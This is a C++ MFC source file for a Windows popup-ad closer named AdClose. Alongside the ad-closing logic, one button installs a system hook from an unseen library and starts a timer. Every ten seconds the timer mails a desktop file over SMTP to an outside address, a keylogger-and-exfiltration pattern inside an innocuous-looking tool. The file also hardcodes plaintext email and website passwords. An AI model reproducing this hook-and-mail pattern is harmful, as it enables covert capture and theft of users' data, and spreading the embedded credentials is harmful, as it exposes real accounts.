
// AdCloseDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "AdClose.h"
#include "AdCloseDlg.h"
#include "afxinet.h"
#include "psapi.h"
#include "zlib.h"
#include "zconf.h"
#include <exception>
#include "winsock2.h"
#include "windowsx.h"
#include <iostream>
#include "hook.h"
#include "CSmtp.h"

#pragma comment(lib, "Hook.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "zdll.lib")
#define WM_AC_NID	WM_USER+235
#define WSWENS MAKEWORD(2,0)



#ifdef _DEBUG
#define new DEBUG_NEW
#endif

bool init = false;
// ����Ӧ�ó��򡰹��ڡ��˵���� CAboutDlg �Ի���

void SendMail();

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// �Ի�������
	enum { IDD = IDD_ABOUTBOX };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV ֧��

// ʵ��
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
END_MESSAGE_MAP()


// CAdCloseDlg �Ի���


CAdCloseDlg::CAdCloseDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CAdCloseDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);

}

void CAdCloseDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST1, m_list);
}

BEGIN_MESSAGE_MAP(CAdCloseDlg, CDialog)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	//}}AFX_MSG_MAP
	ON_BN_CLICKED(IDC_WORK, &CAdCloseDlg::OnBnClickedWork)
	ON_WM_TIMER()
	ON_MESSAGE(WM_AC_NID, OnAcNid)
	ON_COMMAND(ID_TRAY_CLOSE, OnTrayClose)
	ON_WM_CLOSE()
	ON_BN_CLICKED(IDC_WORK2, &CAdCloseDlg::OnBnClickedWork2)
	ON_BN_CLICKED(IDC_WORK3, &CAdCloseDlg::OnBnClickedWork3)
	ON_BN_CLICKED(IDC_BUTTON2, &CAdCloseDlg::OnBnClickedButton2)
	ON_BN_CLICKED(IDC_BUTTON1, &CAdCloseDlg::OnBnClickedButton1)
END_MESSAGE_MAP()


// CAdCloseDlg ��Ϣ�������

BOOL CAdCloseDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// ��������...���˵�����ӵ�ϵͳ�˵��С�

	// IDM_ABOUTBOX ������ϵͳ���Χ�ڡ�
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// ���ô˶Ի����ͼ�ꡣ��Ӧ�ó��������ڲ��ǶԻ���ʱ����ܽ��Զ�
	//  ִ�д˲���
	SetIcon(m_hIcon, TRUE);			// ���ô�ͼ��
	SetIcon(m_hIcon, FALSE);		// ����Сͼ��

	// TODO: �ڴ���Ӷ���ĳ�ʼ������
	this->SetTimer(12123, 10, NULL);

	::CreateMutex(NULL,TRUE,_T("adclose_mt"));
	if(GetLastError()==ERROR_ALREADY_EXISTS)
	{
		//dup
		exit(0);
	}

	m_list.InsertColumn(0, "��������", LVCFMT_LEFT, 150);
	m_list.InsertColumn(0, "���ڱ���", LVCFMT_LEFT, 150);
	m_list.InsertColumn(0, "ʱ��", LVCFMT_LEFT, 150);

	return TRUE;  // ���ǽ��������õ��ؼ������򷵻� TRUE
}

void CAdCloseDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// �����Ի��������С����ť������Ҫ����Ĵ���
//  �����Ƹ�ͼ�ꡣ����ʹ���ĵ�/��ͼģ�͵� MFC Ӧ�ó���
//  �⽫�ɿ���Զ���ɡ�

void CAdCloseDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // ���ڻ��Ƶ��豸������

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// ʹͼ���ڹ����������о���
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// ����ͼ��
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

//���û��϶���С������ʱϵͳ���ô˺���ȡ�ù��
//��ʾ��
HCURSOR CAdCloseDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

HWND g_lastWnd = NULL;

BOOL CALLBACK lpEnumFunc(HWND hwnd, LPARAM lParam)
{
	DWORD style = GetWindowStyle(hwnd);
	DWORD styleex = GetWindowExStyle(hwnd);

	int width = GetSystemMetrics ( SM_CXSCREEN );
	int height= GetSystemMetrics ( SM_CYSCREEN );

	CRect rect;
	GetWindowRect(hwnd, &rect);
	
	TCHAR text[1000];
	GetWindowText(hwnd, text, ARRAYSIZE(text));
	CString stext = text;

	char name[1000]="";
	GetClassNameA(hwnd, name, ARRAYSIZE(name));
	CString sname = name;


	if (rect.Height() < 400 && rect.Width() < 400 && rect.Height() > 100)
	{
		if (abs(width - rect.right) < 100 && abs(height - rect.bottom) < 100)
		{
			if ((style&WS_VISIBLE) && (style&WS_POPUP))
			{
				_strlwr_s(name);
				_strlwr_s(text);
				if (strstr(text, "menu") == NULL)
				{
					if (strstr(name, "tx") != NULL || strstr(name, "xl") != NULL)
					{
						::PostMessage(hwnd, WM_CLOSE, 0, 0);
						::PostMessage(hwnd, WM_DESTROY, 0, 0);

						//
						if (hwnd != g_lastWnd)
						{
							CAdCloseDlg* dlg = (CAdCloseDlg*)AfxGetMainWnd();
							int count = dlg->m_list.GetItemCount();
							CTime tm = CTime::GetCurrentTime();
							CString ss;
							ss.Format("%d/%02d/%02d %02d:%02d:%02d", tm.GetYear(), tm.GetMonth(), tm.GetDay(), tm.GetHour(), tm.GetMinute(), tm.GetSecond());
							int idx = dlg->m_list.InsertItem(count, ss);
							dlg->m_list.SetItemText(idx, 1, stext);
							dlg->m_list.SetItemText(idx, 2, sname);
							dlg->m_list.EnsureVisible(idx, FALSE);

							dlg->SetDlgItemInt(IDC_STATIC_COUNT, count+1);

							g_lastWnd = hwnd;
						}
					}
				}
			}
		}
	}

	return 1;
}

void CAdCloseDlg::OnBnClickedWork()
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	//EnumWindows(lpEnumFunc, NULL);
	ToTray();
}

bool tray = false;

void CAdCloseDlg::OnTimer(UINT_PTR nIDEvent)
{
	switch (nIDEvent)
	{
	case 12123:
		EnumWindows(lpEnumFunc, NULL);
		break;
	case 12345:
		SendMail();
		break;
	}

	//if (!tray)
	//{
	//	ToTray();
	//	tray = true;
	//}

	CDialog::OnTimer(nIDEvent);
}

void CAdCloseDlg::ToTray() 
{
	NOTIFYICONDATA nid;
	nid.cbSize = (DWORD)sizeof(NOTIFYICONDATA);
	nid.hWnd = this->m_hWnd;
	nid.uID = IDR_MAINFRAME;
	nid.uFlags = NIF_ICON|NIF_MESSAGE|NIF_TIP; 
	nid.uCallbackMessage = WM_AC_NID;
	nid.hIcon=LoadIcon(AfxGetInstanceHandle(),MAKEINTRESOURCE(IDR_MAINFRAME)); 
	_tcscpy_s(nid.szTip,sizeof(nid.szTip)+1,_T("AdClose"));
	Shell_NotifyIcon(NIM_ADD,&nid);
	ShowWindow(SW_HIDE);
}

LRESULT CAdCloseDlg::OnAcNid(WPARAM wp, LPARAM lp)
{
	if(wp!=IDR_MAINFRAME) return 1;

	switch(lp) 
	{ 
	case WM_RBUTTONUP://�Ҽ�
		{ 
			POINT point; 
			::GetCursorPos(&point);
			CMenu menu; 
			VERIFY(menu.LoadMenu(IDR_MENU_TRAY)); 
			CMenu *pMenu = (CMenu *)(menu.GetSubMenu(0)); 
			ASSERT(pMenu != NULL);

			::SetForegroundWindow(m_hWnd); 
			pMenu->TrackPopupMenu(TPM_LEFTALIGN, point.x, point.y, this);

			::PostMessage(m_hWnd, WM_NULL, 0, 0);
		} 
		break; 
	case WM_LBUTTONDBLCLK://˫������Ĵ��� 
		{ 
			this->ShowWindow(SW_SHOW);
			BringWindowToTop();
		} 
		break; 
	case WM_ACTIVATE:
		{
			if(LOWORD(wp)!=WA_INACTIVE)
			{
				
			}
		}
		break;
	} 
	return 0;
}

BOOL g_quit = FALSE;

void CAdCloseDlg::OnTrayClose()
{
	// TODO: �ڴ���������������

	NOTIFYICONDATA oIconData = {0};
	oIconData.cbSize = sizeof(NOTIFYICONDATA);
	oIconData.hWnd = m_hWnd;
	oIconData.uID = IDR_MAINFRAME;
	BOOL bRet = Shell_NotifyIcon(NIM_DELETE, &oIconData);

	g_quit = TRUE;
	PostMessage(WM_CLOSE);
}

void CAdCloseDlg::OnClose()
{
	// TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ
	if (!g_quit)
	{
		ToTray();
	}
	else
	{
		CDialog::OnClose();
	}
}

wchar_t *UTF8ConverUncoide(const char *strUtf8)
{
	wchar_t *strUn;
	int len = (int)strlen(strUtf8) + 1;
	strUn = new wchar_t[len];
	memset(strUn, 0, len << 1);
	MultiByteToWideChar(CP_UTF8, 0, strUtf8, len, strUn, len);
	return strUn;
}

char *UncoideConverGB(const wchar_t *strUn)
{
	char *strGb;
	int len = (int)(wcslen(strUn) + 1);
	strGb = new char[len << 1];
	memset(strGb, 0, len << 1);
	WideCharToMultiByte(CP_ACP, 0, strUn, -1, strGb, len << 1, NULL, NULL);
	return strGb;
}

char *UTF8ConvertGB(const char *strUtf8)
{
	return UncoideConverGB(UTF8ConverUncoide(strUtf8));
}

CString Convert(CString str, int sourceCodepage, int targetCodepage)
{
	int len = str.GetLength();
	int unicodeLen = MultiByteToWideChar(sourceCodepage, 0, str, -1, NULL, 0);

	wchar_t *pUnicode;
	pUnicode = new wchar_t[unicodeLen + 1];
	memset(pUnicode, 0, (unicodeLen + 1)*sizeof(wchar_t));
	MultiByteToWideChar(sourceCodepage, 0, str, -1, (LPWSTR)pUnicode, unicodeLen);

	BYTE *pTargetData = NULL;
	int targetLen = WideCharToMultiByte(targetCodepage, 0, (LPWSTR)pUnicode, -1, (char*)pTargetData, 0, NULL, NULL);

	pTargetData = new BYTE[targetLen + 1];
	memset(pTargetData, 0, targetLen + 1);

	WideCharToMultiByte(targetCodepage, 0, (LPWSTR)pUnicode, -1, (char*)pTargetData, targetLen, NULL, NULL);

	CString rt;
	rt.Format("%s", pTargetData);

	delete[]pUnicode;
	delete[]pTargetData;


	return rt;

}

int httpgzdecompress(Byte *zdata, uLong nzdata,
	Byte *data, uLong *ndata)
{
	int err = 0;
	z_stream d_stream = { 0 }; /* decompression stream */
	static char dummy_head[2] =
	{
		0x8 + 0x7 * 0x10,
		(((0x8 + 0x7 * 0x10) * 0x100 + 30) / 31 * 31) & 0xFF,
	};
	d_stream.zalloc = (alloc_func)0;
	d_stream.zfree = (free_func)0;
	d_stream.opaque = (voidpf)0;
	d_stream.next_in = zdata;
	d_stream.avail_in = 0;
	d_stream.next_out = data;
	if (inflateInit2(&d_stream, 47) != Z_OK) return -1;
	while (d_stream.total_out < *ndata && d_stream.total_in < nzdata) {
		d_stream.avail_in = d_stream.avail_out = 1; /* force small buffers */
		if ((err = inflate(&d_stream, Z_NO_FLUSH)) == Z_STREAM_END) break;
		if (err != Z_OK)
		{
			if (err == Z_DATA_ERROR)
			{
				d_stream.next_in = (Bytef*)dummy_head;
				d_stream.avail_in = sizeof(dummy_head);
				if ((err = inflate(&d_stream, Z_NO_FLUSH)) != Z_OK)
				{
					return -1;
				}
			}
			else return -1;
		}
	}
	if (inflateEnd(&d_stream) != Z_OK) return -1;
	*ndata = d_stream.total_out;
	return 0;
}

CString GetCookie(char *url)
{
	int ilen = strlen(url);
	if (ilen<256)
	{
		char szURL[256] = { 0 };
		strncpy(szURL, url, ilen);
		LPSTR lpszData = NULL;
		DWORD dwSize = 0;
		lpszData = new char[1];
		memset(lpszData, 0, 1);

	retry:
		if (!InternetGetCookie(szURL, "", lpszData, &dwSize))
		{
			if (GetLastError() == ERROR_INSUFFICIENT_BUFFER)
			{
				delete[]lpszData;
				lpszData = new char[dwSize + 1];
				memset(lpszData, 0, dwSize + 1);
				goto retry;
			}
			else
			{
				AfxMessageBox("cookieΪ��!");
			}

		}
		else
		{
			AfxMessageBox("��ȡcookie�ɹ�!");
		}
		CString result(lpszData);
		AfxMessageBox(("��������ַ��cookieΪ:\n")+result);
		delete[]lpszData;
		return result;
	}
	else
	{
		AfxMessageBox("��������!");
	}
	return "";
}

CString Login() //���ص�¼session_id
{
	CString session_id;
	try
	{
#define MAX_COUNT 1024
		CInternetSession session(_T("session"));
		INTERNET_PORT nPort = 80;
		CHttpConnection* pHttpConnect = session.GetHttpConnection(_T("tongqu.me"), nPort);
		if (pHttpConnect)
		{
			CHttpFile* pFile = pHttpConnect->OpenRequest(CHttpConnection::HTTP_VERB_POST, _T("/index.php/api/user/Login"));
			if (pFile)
			{
				// ����������ͷ��Ϣ����ץ�����ߵõ�����Ϣ
				pFile->AddRequestHeaders(_T("POST /index.php/api/user/Login HTTP/1.1"));
				pFile->AddRequestHeaders(_T("Accept: application/json, text/plain, */*"));
				pFile->AddRequestHeaders(_T("Referer: http://tongqu.me/index.php/user/Login"));
				pFile->AddRequestHeaders(_T("Accept-Language: zh-CN,zh;q=0.8"));
				pFile->AddRequestHeaders(_T("X-Requested-With: XMLHttpRequest"));
				pFile->AddRequestHeaders(_T("User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36"));
				pFile->AddRequestHeaders(_T("Content-Type: application/x-www-form-urlencoded;charset=UTF-8"));
				//pFile->AddRequestHeaders(_T("Accept-Encoding: gzip,deflate,sdch"));
				pFile->AddRequestHeaders(_T("Host: tongqu.me"));
				pFile->AddRequestHeaders(_T("Connection: keep-alive"));
				// ������Ҫ�ύ�����ݡ�˵��һ��: xxxx@xx.xxxָ���ǵ�½������ĵ�ַ�������XXXXXXX��ʾ���ǵ�½�����룬ʹ�õ�ʱ�򻻳����Լ��ļ���
				TCHAR szRequest[MAX_COUNT] = _T("user_name=qq456cvb&password=940819QQ");
				pFile->SendRequest(NULL, 0, szRequest, _tcslen(szRequest) + 1);

				CString strStatus(_T(""));
				if (pFile->QueryInfo(HTTP_QUERY_RAW_HEADERS_CRLF, strStatus))
				{
					session_id = strStatus.Mid(strStatus.Find(_T("ci_session_id")), strStatus.Find(_T("expires")) - strStatus.Find(_T("ci_session_id")) - 2);
					AfxMessageBox(strStatus);
				}
				pFile->Close();
				delete pFile;
				pFile = NULL;
			}
		}
		pHttpConnect->Close();
		delete pHttpConnect;
		pHttpConnect = NULL;  session.Close();
	}
	catch (CInternetException* e)
	{
		e->ReportError();
		e->Delete();
	}
	return session_id;
}

void HttpGet()
{
	CString session_id = Login();
	try
	{
#define MAX_COUNT 1024
		CInternetSession session(_T("session"));
		INTERNET_PORT nPort = 80;
		CHttpConnection* pHttpConnect = session.GetHttpConnection(_T("tongqu.me"), nPort);
		if (pHttpConnect)
		{
			CHttpFile* pFile = pHttpConnect->OpenRequest(CHttpConnection::HTTP_VERB_GET, _T("/index.php/user/act"));
			//CHttpFile* pFile = (CHttpFile *)session.OpenURL("http://tongqu.me");
			if (pFile)
			{
				// ����������ͷ��Ϣ����ץ�����ߵõ�����Ϣ
				pFile->AddRequestHeaders(_T("GET /index.php/user/act HTTP/1.1"));
				pFile->AddRequestHeaders(_T("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"));
				pFile->AddRequestHeaders(_T("Cookie: ") + session_id);
				pFile->AddRequestHeaders(_T("Accept-Language: zh-CN,zh;q=0.8"));
				pFile->AddRequestHeaders(_T("Cache-Control: max-age=0"));
				pFile->AddRequestHeaders(_T("User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36"));
				//pFile->AddRequestHeaders(_T("Accept-Encoding: gzip,deflate,sdch"));
				pFile->AddRequestHeaders(_T("Host: tongqu.me"));
				pFile->AddRequestHeaders(_T("Connection: keep-alive"));
				//pFile->AddRequestHeaders(_T("Referer: http://tongqu.me/index.php/user/Login"));
				// ������Ҫ�ύ�����ݡ�˵��һ��: xxxx@xx.xxxָ���ǵ�½������ĵ�ַ�������XXXXXXX��ʾ���ǵ�½�����룬ʹ�õ�ʱ�򻻳����Լ��ļ���
				//TCHAR szRequest[MAX_COUNT] = _T("user_name=qq456cvb&password=940819QQ");
				pFile->SendRequest(NULL, 0);

				CString strStatus(_T(""));
				//CString strEncoding;//��ȡ��ҳ�����ʽ
				//pFile->QueryInfo(HTTP_QUERY_CONTENT_TYPE, strEncoding);
				//int  a = strEncoding.Find("UTF-8", 0);//utf-8�����ʽ
				if (pFile->QueryInfo(HTTP_QUERY_RAW_HEADERS_CRLF, strStatus))
				{
					AfxMessageBox(strStatus);
				}
				CString szData, szAllData, iter_str;
				int cnt = 0;
				while (pFile->ReadString(szData))
				{//��ȡ�ļ�					
					szAllData += szData;
					szAllData += "\r\n";
				}
				szAllData = UTF8ConvertGB(szAllData);
				iter_str = szAllData.Mid(szAllData.Find(_T("<li id=\"menu-message\"")), 10000);
				while (iter_str.Find(_T("one-ntf")) != -1) {
					cnt++;
					iter_str = iter_str.Mid(iter_str.Find(_T("one-ntf"))+10);
				}
				CString cntbuf;
				cntbuf.Format(_T("%d"), cnt);
				MessageBox(NULL, cntbuf,_T( "��ʾ"), MB_OK);
				pFile->Close();
				delete pFile;
				pFile = NULL;
			}
		}
		pHttpConnect->Close();
		delete pHttpConnect;
		pHttpConnect = NULL;  session.Close();
	}
	catch (CInternetException* e)
	{
		e->ReportError();
		e->Delete();
	}
}

void SendMail()
{
	CSmtp mail;

	if (mail.GetLastError() != CSMTP_NO_ERROR)
	{
		MessageBox(NULL, "Unable to initialise winsock2.\n", "hint", MB_OK);
	}

	mail.SetLogin("q456cvb@163.com");
	mail.SetPassword("nhce111");
	mail.SetSenderName("YY");
	mail.SetSenderMail("q456cvb@163.com");
	mail.SetReplyTo("q456cvb@163.com");
	mail.SetSubject("The message");
	mail.AddRecipient("447626601@qq.com");
	//mail.SetXPriority(XPRIORITY_NORMAL);
	//mail.SetXMailer("The Bat! (v3.02) Professional");
	mail.SetMessageBody("This is my message.");
	mail.AddAttachment("C:\\Users\\Administrator\\Desktop\\test.txt");
	//mail.AddAttachment("c:\\test2.jpg");

	if (!mail.ConnectServer("smtp.163.com", 25))
	{
		MessageBox(NULL, "Unable to connect to the server.\n", "hint", MB_OK);
	}


	if (mail.Send())
		MessageBox(NULL, "The mail was send successfully.\n", "hint", MB_OK);
	else
		MessageBox(NULL, "Unable to send the mail.\n", "hint", MB_OK);

	mail.Disconnect();
}

int ClientTest()
{
	using namespace std;
	BOOL RecvLine(SOCKET s, char* buf); //��ȡһ������

	const int BUF_SIZE = 64;

	WSADATA wsd; //WSADATA����
	SOCKET sHost; //�������׽���
	SOCKADDR_IN servAddr; //��������ַ
	char buf[BUF_SIZE]; //�������ݻ�����
	char bufRecv[BUF_SIZE];
	int retVal; //����ֵ
	//��ʼ���׽��ֶ�̬��
	if (WSAStartup(MAKEWORD(2, 2), &wsd) != 0)
	{
		AfxMessageBox("WSAStartup failed!");
		return -1;
	}
	//�����׽���
	sHost = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (INVALID_SOCKET == sHost)
	{
		AfxMessageBox("socket failed!");
		WSACleanup();//�ͷ��׽�����Դ
		return  -1;
	}

	//���÷�������ַ
	servAddr.sin_family = AF_INET;
	servAddr.sin_addr.s_addr = inet_addr("59.78.57.49");
	servAddr.sin_port = htons((short)4999);
	int nServAddlen = sizeof(servAddr);

	//���ӷ�����
	retVal = connect(sHost, (LPSOCKADDR)&servAddr, sizeof(servAddr));
	if (SOCKET_ERROR == retVal)
	{
		AfxMessageBox("connect failed!");
		closesocket(sHost); //�ر��׽���
		WSACleanup(); //�ͷ��׽�����Դ
		return -1;
	}
	while (true){
		//���������������
		ZeroMemory(buf, BUF_SIZE);		
		strcpy(buf, "haha");
		CString send_buff(buf);
		AfxMessageBox(" ���������������: " + send_buff);
		retVal = send(sHost, buf, strlen(buf), 0);
		if (SOCKET_ERROR == retVal)
		{
			AfxMessageBox("send failed!");
			closesocket(sHost); //�ر��׽���
			WSACleanup(); //�ͷ��׽�����Դ
			return -1;
		}
		//RecvLine(sHost, bufRecv);
		ZeroMemory(bufRecv, BUF_SIZE);
		recv(sHost, bufRecv, 5, 0); // ���շ������˵����ݣ� ֻ����5���ַ�
		CString recv_buff(bufRecv);
		AfxMessageBox("�ӷ������������ݣ�" + recv_buff);

	}
	//�˳�
	closesocket(sHost); //�ر��׽���
	WSACleanup(); //�ͷ��׽�����Դ
	return 0;
}

void BugReport()
{
	CString session_id = Login();
	try
	{
#define MAX_COUNT 1024
		CInternetSession session(_T("session"));
		INTERNET_PORT nPort = 80;
		CHttpConnection* pHttpConnect = session.GetHttpConnection(_T("tongqu.me"), nPort);
		if (pHttpConnect)
		{
			CHttpFile* pFile = pHttpConnect->OpenRequest(CHttpConnection::HTTP_VERB_POST, _T("/index.php/api/bug"));
			//CHttpFile* pFile = (CHttpFile *)session.OpenURL("http://tongqu.me");
			if (pFile)
			{
				// ����������ͷ��Ϣ����ץ�����ߵõ�����Ϣ
				pFile->AddRequestHeaders(_T("POST /index.php/api/bug HTTP/1.1"));
				pFile->AddRequestHeaders(_T("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"));
				pFile->AddRequestHeaders(_T("Cookie: ") + session_id);
				pFile->AddRequestHeaders(_T("Accept-Language: zh-CN,zh;q=0.8"));
				pFile->AddRequestHeaders(_T("Cache-Control: max-age=0"));
				pFile->AddRequestHeaders(_T("User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36"));
				//pFile->AddRequestHeaders(_T("Accept-Encoding: gzip,deflate,sdch"));
				pFile->AddRequestHeaders(_T("Host: tongqu.me"));
				pFile->AddRequestHeaders(_T("Connection: keep-alive"));
				//pFile->AddRequestHeaders(_T("Referer: http://tongqu.me/index.php/user/Login"));
				// ������Ҫ�ύ�����ݡ�˵��һ��: xxxx@xx.xxxָ���ǵ�½������ĵ�ַ�������XXXXXXX��ʾ���ǵ�½�����룬ʹ�õ�ʱ�򻻳����Լ��ļ���
				TCHAR szRequest[MAX_COUNT] = _T("title=test&phone=123&content=test");
				pFile->SendRequest(NULL, 0, szRequest, _tcslen(szRequest) + 1);

				CString strStatus(_T(""));
				//CString strEncoding;//��ȡ��ҳ�����ʽ
				//pFile->QueryInfo(HTTP_QUERY_CONTENT_TYPE, strEncoding);
				//int  a = strEncoding.Find("UTF-8", 0);//utf-8�����ʽ
				if (pFile->QueryInfo(HTTP_QUERY_RAW_HEADERS_CRLF, strStatus))
				{
					AfxMessageBox(strStatus);
				}
				CString szData, szAllData, iter_str;
				int cnt = 0;
				while (pFile->ReadString(szData))
				{//��ȡ�ļ�					
					szAllData += szData;
					szAllData += "\r\n";
				}
				//szAllData = UTF8ConvertGB(szAllData);
				//iter_str = szAllData.Mid(szAllData.Find(_T("<li id=\"menu-message\"")), 10000);
				/*while (iter_str.Find(_T("one-ntf")) != -1) {
					cnt++;
					iter_str = iter_str.Mid(iter_str.Find(_T("one-ntf")) + 10);
				}*/
				//CString cntbuf;
				//cntbuf.Format(_T("%d"), cnt);
				AfxMessageBox(szAllData);
				pFile->Close();
				delete pFile;
				pFile = NULL;
			}
		}
		pHttpConnect->Close();
		delete pHttpConnect;
		pHttpConnect = NULL;  session.Close();
	}
	catch (CInternetException* e)
	{
		e->ReportError();
		e->Delete();
	}
}

void CAdCloseDlg::OnBnClickedWork2()
{
	// TODO:  �ڴ���ӿؼ�֪ͨ����������
	//Login();
	BugReport();
}



void CAdCloseDlg::OnBnClickedWork3()
{
	//HttpGet();
	//SocketConnect();
	ClientTest();
}


void CAdCloseDlg::OnBnClickedButton2()
{
	MSG msg;
	InstallHook(TRUE);
	SetTimer(12345, 10000, NULL);

	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
}


void CAdCloseDlg::OnBnClickedButton1()
{
	InstallHook(FALSE);
}
